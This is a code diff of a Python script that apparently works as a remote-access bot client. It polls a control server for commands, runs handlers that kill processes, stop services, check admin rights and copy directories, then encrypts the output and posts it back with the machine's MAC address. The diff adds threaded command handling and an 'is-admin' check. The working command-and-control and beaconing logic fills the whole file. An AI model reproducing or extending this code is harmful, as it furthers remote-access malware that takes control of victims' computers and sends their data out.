@@ -1,5 +1,6 @@
 import subprocess
 import random
+from threading import Thread
 import time
 import uuid
 import requests
@@ -87,6 +88,7 @@ def handle_input(message: str):
         "repeat-kill-proc": lu.repeat_kill_by_name,
         "get-all-services": lu.get_all_services_cmd,
         "stop-service": lu.stop_service_cmd,
+        "is-admin": lu.is_admin,
         "get-dirs": c.get_dirs,
         "add-copy-dir": c.add_dir,
         "copy-to-defaults": c.copy_default,
@@ -108,6 +110,19 @@ def get_new_ip(ip):
     if len(Ips) >= i+2:
         return Ips[i+1]
     return Ips[0]
+
+def handle_command(cmd, ip, mac):
+    try:
+        txt = f"{cmd}\n{handle_input(cmd)}"
+        txt = eu.encrypt1(txt)
+    except Exception as e: txt = str(e)
+
+    headers = {'X-MAC-Address': mac, 'Content-Type': 'text/plain'}
+
+    try:
+        r2 = requests.post(ip, data=txt, headers=headers)
+        if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
+    except Exception as e: print(f"Error in post: {e}")
 
 def start_server():
     ip = CONTROL
@@ -136,18 +151,22 @@ def start_server():
             cmds = r.content.decode().split("\n")
             if len(cmds[0]) > 1:
                 for cmd in cmds:
+                    cmdthread = Thread(target=handle_command, args=(cmd, ip, mac))
+                    cmdthread.start()
 
-                    try:
-                        txt = f"{cmd}\n{handle_input(cmd)}"
-                    except Exception as e:
-                        txt = str(e)
+                    # try:
+                    #     txt = f"{cmd}\n{handle_input(cmd)}"
+                    # except Exception as e:
+                    #     txt = str(e)
 
-                    txt = eu.encrypt1(f"{mac}\n{txt}")
-                    headers = {'Content-Type': 'text/plain'}
-                    try:
-                        r2 = requests.post(ip, data=txt, headers=headers)
-                        if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
-                    except Exception as e: print(f"Error in post: {e}")
+                    # #txt = eu.encrypt1(f"{mac}\n{txt}")
+                    
+                    # headers = {'X-MAC-Address': mac, 'Content-Type': 'text/plain'}
+                    # #headers = {'Content-Type': 'text/plain'}
+                    # try:
+                    #     r2 = requests.post(ip, data=txt, headers=headers)
+                    #     if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
+                    # except Exception as e: print(f"Error in post: {e}")
 
 if __name__ == '__main__':
     start_server()
